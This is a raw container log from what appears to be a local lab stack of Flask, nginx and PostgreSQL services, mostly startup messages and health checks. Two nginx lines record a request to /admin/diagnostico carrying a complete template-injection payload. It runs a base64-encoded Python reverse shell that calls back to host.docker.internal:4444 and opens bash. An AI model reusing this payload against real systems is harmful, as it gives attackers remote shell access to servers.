db-1  | 2026-06-09T06:50:59.921147078Z The files belonging to this database system will be owned by user "postgres".
db-1       | 2026-06-09T06:51:04.574506237Z 2026-06-09 06:51:04.574 UTC [42] LOG:  checkpoint starting: shutdown immediate
db-1       | 2026-06-09T06:51:05.138192535Z 2026-06-09 06:51:05.137 UTC [42] LOG:  checkpoint complete: wrote 930 buffers (5.7%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.062 s, sync=0.465 s, total=0.574 s; sync files=304, longest=0.009 s, average=0.002 s; distance=4254 kB, estimate=4254 kB
db-1       | 2026-06-09T06:51:05.160776712Z 2026-06-09 06:51:05.160 UTC [41] LOG:  database system is shut down
webapp-1   | 2026-06-09T06:51:07.166372272Z  * Serving Flask app 'app'
webapp-1   | 2026-06-09T06:51:07.166430655Z  * Debug mode: off
webapp-1   | 2026-06-09T06:51:07.169892925Z [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
webapp-1   | 2026-06-09T06:51:07.169913224Z  * Running on all addresses (0.0.0.0)
webapp-1   | 2026-06-09T06:51:07.169917763Z  * Running on http://127.0.0.1:5000
webapp-1   | 2026-06-09T06:51:07.169921440Z  * Running on http://172.18.0.3:5000
webapp-1   | 2026-06-09T06:51:07.169924867Z [33mPress CTRL+C to quit[0m
webapp-1   | 2026-06-09T06:51:19.097745489Z 172.20.0.3 - - [09/Jun/2026 08:51:19] "[32mGET /admin HTTP/1.1[0m" 302 -
webapp-1   | 2026-06-09T06:51:19.121887915Z 172.20.0.3 - - [09/Jun/2026 08:51:19] "GET /admin/dashboard HTTP/1.1" 200 -
webapp-1   | 2026-06-09T06:51:36.447981105Z 172.20.0.3 - - [09/Jun/2026 08:51:36] "GET /admin/diagnostico HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:51:00.807510773Z  * Serving Flask app 'app'
backend-1  | 2026-06-09T06:51:00.807625345Z  * Debug mode: off
backend-1  | 2026-06-09T06:51:00.812934870Z [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
backend-1  | 2026-06-09T06:51:00.812962153Z  * Running on http://127.0.0.1:5000
backend-1  | 2026-06-09T06:51:00.812967384Z [33mPress CTRL+C to quit[0m
backend-1  | 2026-06-09T06:51:05.441474200Z 127.0.0.1 - - [09/Jun/2026 06:51:05] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:51:10.589772950Z 127.0.0.1 - - [09/Jun/2026 06:51:10] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:51:15.723029839Z 127.0.0.1 - - [09/Jun/2026 06:51:15] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:51:20.839387058Z 127.0.0.1 - - [09/Jun/2026 06:51:20] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:51:25.949659253Z 127.0.0.1 - - [09/Jun/2026 06:51:25] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:51:31.089170196Z 127.0.0.1 - - [09/Jun/2026 06:51:31] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:51:36.240548700Z 127.0.0.1 - - [09/Jun/2026 06:51:36] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:51:41.366913900Z 127.0.0.1 - - [09/Jun/2026 06:51:41] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:51:46.486764948Z 127.0.0.1 - - [09/Jun/2026 06:51:46] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:51:51.593865150Z 127.0.0.1 - - [09/Jun/2026 06:51:51] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:51:56.717922320Z 127.0.0.1 - - [09/Jun/2026 06:51:56] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:52:01.856037302Z 127.0.0.1 - - [09/Jun/2026 06:52:01] "GET /health HTTP/1.1" 200 -
nginx-1    | 2026-06-09T06:51:06.894532916Z /docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration
nginx-1    | 2026-06-09T06:51:06.894596750Z /docker-entrypoint.sh: Looking for shell scripts in /docker-entrypoint.d/
nginx-1    | 2026-06-09T06:51:06.897087995Z /docker-entrypoint.sh: Launching /docker-entrypoint.d/10-listen-on-ipv6-by-default.sh
nginx-1    | 2026-06-09T06:51:06.915177944Z 10-listen-on-ipv6-by-default.sh: info: Getting the checksum of /etc/nginx/conf.d/default.conf
nginx-1    | 2026-06-09T06:51:06.942118390Z 10-listen-on-ipv6-by-default.sh: info: Enabled listen on IPv6 in /etc/nginx/conf.d/default.conf
nginx-1    | 2026-06-09T06:51:06.942806245Z /docker-entrypoint.sh: Sourcing /docker-entrypoint.d/15-local-resolvers.envsh
nginx-1    | 2026-06-09T06:51:06.943492767Z /docker-entrypoint.sh: Launching /docker-entrypoint.d/20-envsubst-on-templates.sh
nginx-1    | 2026-06-09T06:51:06.951413720Z /docker-entrypoint.sh: Launching /docker-entrypoint.d/30-tune-worker-processes.sh
nginx-1    | 2026-06-09T06:51:06.955532434Z /docker-entrypoint.sh: Configuration complete; ready for start up
nginx-1    | 2026-06-09T06:51:19.098346389Z 172.20.0.1 - - [09/Jun/2026:06:51:19 +0000] "GET /admin HTTP/1.1" 302 219 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
nginx-1    | 2026-06-09T06:51:19.122541843Z 172.20.0.1 - - [09/Jun/2026:06:51:19 +0000] "GET /admin/dashboard HTTP/1.1" 200 5148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
nginx-1    | 2026-06-09T06:51:36.448438845Z 172.20.0.1 - - [09/Jun/2026:06:51:36 +0000] "GET /admin/diagnostico HTTP/1.1" 200 3556 "http://localhost:8080/admin/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
backend-1  | 2026-06-09T06:52:07.000282442Z 127.0.0.1 - - [09/Jun/2026 06:52:06] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:52:12.134475247Z 127.0.0.1 - - [09/Jun/2026 06:52:12] "GET /health HTTP/1.1" 200 -
db-1       | 2026-06-09T06:51:05.253571267Z  done
db-1       | 2026-06-09T06:51:05.253645060Z server stopped
db-1       | 2026-06-09T06:51:05.255946577Z 
db-1       | 2026-06-09T06:51:05.255961396Z PostgreSQL init process complete; ready for start up.
db-1       | 2026-06-09T06:51:05.255970504Z 
db-1       | 2026-06-09T06:51:05.346370818Z 2026-06-09 06:51:05.345 UTC [1] LOG:  starting PostgreSQL 15.18 on x86_64-pc-linux-musl, compiled by gcc (Alpine 15.2.0) 15.2.0, 64-bit
db-1       | 2026-06-09T06:51:05.349005025Z 2026-06-09 06:51:05.348 UTC [1] LOG:  listening on IPv4 address "0.0.0.0", port 5432
db-1       | 2026-06-09T06:51:05.349044953Z 2026-06-09 06:51:05.348 UTC [1] LOG:  listening on IPv6 address "::", port 5432
db-1       | 2026-06-09T06:51:05.393736871Z 2026-06-09 06:51:05.393 UTC [1] LOG:  listening on Unix socket "/var/run/postgresql/.s.PGSQL.5432"
db-1       | 2026-06-09T06:51:05.417348967Z 2026-06-09 06:51:05.416 UTC [59] LOG:  database system was shut down at 2026-06-09 06:51:05 UTC
db-1       | 2026-06-09T06:51:05.438246215Z 2026-06-09 06:51:05.437 UTC [1] LOG:  database system is ready to accept connections
db-1       | 2026-06-09T06:56:05.448892466Z 2026-06-09 06:56:05.448 UTC [57] LOG:  checkpoint starting: time
db-1       | 2026-06-09T06:56:05.537136666Z 2026-06-09 06:56:05.536 UTC [57] LOG:  checkpoint complete: wrote 3 buffers (0.0%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.035 s, sync=0.007 s, total=0.089 s; sync files=2, longest=0.004 s, average=0.004 s; distance=0 kB, estimate=0 kB
backend-1  | 2026-06-09T06:52:17.264799386Z 127.0.0.1 - - [09/Jun/2026 06:52:17] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:52:22.383480536Z 127.0.0.1 - - [09/Jun/2026 06:52:22] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:52:27.515337518Z 127.0.0.1 - - [09/Jun/2026 06:52:27] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:52:32.635194435Z 127.0.0.1 - - [09/Jun/2026 06:52:32] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:52:37.815438371Z 127.0.0.1 - - [09/Jun/2026 06:52:37] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:52:42.942753062Z 127.0.0.1 - - [09/Jun/2026 06:52:42] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:52:48.080984579Z 127.0.0.1 - - [09/Jun/2026 06:52:48] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:52:53.218909280Z 127.0.0.1 - - [09/Jun/2026 06:52:53] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:52:58.348414520Z 127.0.0.1 - - [09/Jun/2026 06:52:58] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:53:03.473597728Z 127.0.0.1 - - [09/Jun/2026 06:53:03] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:53:08.603621534Z 127.0.0.1 - - [09/Jun/2026 06:53:08] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:53:13.723916489Z 127.0.0.1 - - [09/Jun/2026 06:53:13] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:53:18.872885253Z 127.0.0.1 - - [09/Jun/2026 06:53:18] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:53:24.007773485Z 127.0.0.1 - - [09/Jun/2026 06:53:24] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:53:29.152278927Z 127.0.0.1 - - [09/Jun/2026 06:53:29] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:53:34.286626772Z 127.0.0.1 - - [09/Jun/2026 06:53:34] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:53:39.409632006Z 127.0.0.1 - - [09/Jun/2026 06:53:39] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:53:44.543510898Z 127.0.0.1 - - [09/Jun/2026 06:53:44] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:53:49.671194846Z 127.0.0.1 - - [09/Jun/2026 06:53:49] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:53:54.828171776Z 127.0.0.1 - - [09/Jun/2026 06:53:54] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:53:58.589720692Z 172.18.0.3 - - [09/Jun/2026:06:53:58 +0000] "GET /empleados HTTP/1.1" 400 237 "-" "curl/8.14.1"
backend-1  | 2026-06-09T06:53:59.946400074Z 127.0.0.1 - - [09/Jun/2026 06:53:59] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:54:05.077031710Z 127.0.0.1 - - [09/Jun/2026 06:54:05] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:54:10.210744509Z 127.0.0.1 - - [09/Jun/2026 06:54:10] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:54:15.340020428Z 127.0.0.1 - - [09/Jun/2026 06:54:15] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:54:20.477258215Z 127.0.0.1 - - [09/Jun/2026 06:54:20] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:54:25.590985560Z 127.0.0.1 - - [09/Jun/2026 06:54:25] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:54:30.721617836Z 127.0.0.1 - - [09/Jun/2026 06:54:30] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:54:35.857457928Z 127.0.0.1 - - [09/Jun/2026 06:54:35] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:54:41.020137762Z 127.0.0.1 - - [09/Jun/2026 06:54:41] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:54:46.161457753Z 127.0.0.1 - - [09/Jun/2026 06:54:46] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:54:51.312697887Z 127.0.0.1 - - [09/Jun/2026 06:54:51] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:54:56.437701312Z 127.0.0.1 - - [09/Jun/2026 06:54:56] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:55:01.569506920Z 127.0.0.1 - - [09/Jun/2026 06:55:01] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:55:06.728433392Z 127.0.0.1 - - [09/Jun/2026 06:55:06] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:55:11.855644730Z 127.0.0.1 - - [09/Jun/2026 06:55:11] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:55:16.979330421Z 127.0.0.1 - - [09/Jun/2026 06:55:16] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:55:22.100509644Z 127.0.0.1 - - [09/Jun/2026 06:55:22] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:55:27.246772420Z 127.0.0.1 - - [09/Jun/2026 06:55:27] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:55:32.368937609Z 127.0.0.1 - - [09/Jun/2026 06:55:32] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:55:37.496961528Z 127.0.0.1 - - [09/Jun/2026 06:55:37] "GET /health HTTP/1.1" 200 -
nginx-1    | 2026-06-09T06:52:38.851780223Z 2026/06/09 06:52:38 [error] 30#30: *2 upstream timed out (110: Operation timed out) while reading response header from upstream, client: 172.20.0.1, server: , request: "GET /admin/diagnostico?host=%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+%7C+base64+-d+%7C+python3%27%29.read%28%29+%7D%7D HTTP/1.1", upstream: "http://172.20.0.2:5000/admin/diagnostico?host=%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+%7C+base64+-d+%7C+python3%27%29.read%28%29+%7D%7D", host: "localhost:8080", referrer: "http://localhost:8080/admin/diagnostico"
nginx-1    | 2026-06-09T06:52:38.852689712Z 172.20.0.1 - - [09/Jun/2026:06:52:38 +0000] "GET /admin/diagnostico?host=%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27echo+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk%3D+%7C+base64+-d+%7C+python3%27%29.read%28%29+%7D%7D HTTP/1.1" 504 569 "http://localhost:8080/admin/diagnostico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
backend-1  | 2026-06-09T06:55:42.613561694Z 127.0.0.1 - - [09/Jun/2026 06:55:42] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:55:47.758021231Z 127.0.0.1 - - [09/Jun/2026 06:55:47] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:55:52.894610002Z 127.0.0.1 - - [09/Jun/2026 06:55:52] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:55:58.033334319Z 127.0.0.1 - - [09/Jun/2026 06:55:58] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:56:03.189078689Z 127.0.0.1 - - [09/Jun/2026 06:56:03] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:56:08.317651969Z 127.0.0.1 - - [09/Jun/2026 06:56:08] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:56:13.465488606Z 127.0.0.1 - - [09/Jun/2026 06:56:13] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:56:18.586325552Z 127.0.0.1 - - [09/Jun/2026 06:56:18] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:56:23.750866595Z 127.0.0.1 - - [09/Jun/2026 06:56:23] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:56:28.899723261Z 127.0.0.1 - - [09/Jun/2026 06:56:28] "GET /health HTTP/1.1" 200 -
backend-1  | 2026-06-09T06:56:34.018851512Z 127.0.0.1 - - [09/Jun/2026 06:56:34] "GET /health HTTP/1.1" 200 -
